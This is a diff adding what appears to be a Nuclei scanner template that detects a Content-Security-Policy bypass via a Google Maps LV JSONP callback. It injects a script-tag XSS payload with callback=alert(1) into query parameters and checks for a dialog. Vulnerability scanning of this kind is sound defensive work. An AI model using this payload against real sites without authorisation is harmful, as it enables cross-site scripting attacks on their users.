@@ -1,0 +1,55 @@
+id: google-maps-lv-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Google Maps LV
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,google-maps-lv,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "google.lv"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: google_maps_lv_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://maps.google.lv/maps/api/js?sensor=false&callback=alert(1)"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "google_maps_lv_csp_xss == true"
+# digest: 4a0a00473045022100f734360572b96cd1563cf1739a09334b1f699b38011f84dfe423e0e0411a54b40220733058bc4956918929752f63b09218c4acb1170912a7a0711f8a952b1f2985be:922c64590222798bb761d5b6d8e72950
